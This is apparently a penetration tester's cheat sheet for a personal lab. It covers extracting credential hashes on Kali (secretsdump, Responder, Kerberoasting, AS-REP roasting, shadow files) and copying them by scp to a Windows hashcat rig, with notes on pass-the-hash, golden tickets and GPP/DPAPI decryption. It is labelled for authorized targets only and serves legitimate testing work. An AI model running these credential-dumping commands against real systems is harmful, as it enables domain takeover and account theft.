# Kali capture → CrackLab handoff

Kali captures/extracts credential material; the Windows rig cracks. This is the
handoff cheat sheet. **Authorized targets only** (your HTB lab / CPTS / a scoped
engagement). Nothing here cracks — it *gets* the material and ships it over.

Set once:
```bash
WIN=RIG_IP          # NAT default; host-only RIG_IP_HOSTONLY; bridged RIG_IP_BRIDGED
send() { scp "$1" "user@$WIN:CrackLab/hashes/"; }   # send a hash file to the rig
```

## Crackable → send to the rig, then `auto`
| Material | Get it (Kali) | hashcat mode |
|---|---|---|
| NTDS / SAM (NTLM) | `secretsdump.py DOM/user:pass@dc -just-dc-ntlm` | 1000 |
| NetNTLMv2 | `responder -I eth0` (or `ntlmrelayx`) | 5600 |
| Kerberoast (TGS) | `GetUserSPNs.py DOM/user:pass -request -dc-ip <dc>` | 13100 |
| AS-REP roast | `GetNPUsers.py DOM/ -usersfile users -no-pass` | 18200 |
| DCC2 (cached) | `secretsdump.py ... -cached` (LSA) | 2100 |
| Linux shadow | `unshadow passwd shadow > sh.txt` | 1800 / 500 |
| Files (zip/pdf/7z) | `zip2john f.zip > h`, `pdf2john …`, `7z2john …` (Kali has perl) | see hashcat wiki |

Then on the rig (over SSH):
```
python core\cracklab.py triage hashes\ntds.txt --out hashes\crackable.txt   # skip machine/krbtgt
python core\cracklab.py auto hashes\crackable.txt --scope <s> --provenance secretsdump --username
python core\cracklab.py report hashes\crackable.txt --mode 1000 --username --context ad
```

## Abuse / decrypt → do NOT waste the GPU (see the sibling scripts)
| Material | Reality | Script |
|---|---|---|
| Machine acct / krbtgt hash | ~random 120-char → **pass-the-hash / golden ticket**, never crack | `triage` flags these |
| GPP cpassword | Microsoft published the AES key → **decrypt** | `gpp-decrypt.sh` |
| LAPS (legacy) | cleartext local-admin, **just read** with rights | `laps-read.sh` |
| DPAPI (browser/RDP/Wi-Fi/vault) | **decrypt** with the domain backup key (no GPU) | `dpapi-harvest.sh` |

## HIBP domain audit (no cracking, huge finding)
On the rig, once `scripts\fetch-hibp.ps1` has run:
```
python core\cracklab.py hibp hashes\ntds.txt --scope <s> --context ad
```
Flags every account whose NT hash appears in the ~1B breached-password corpus.
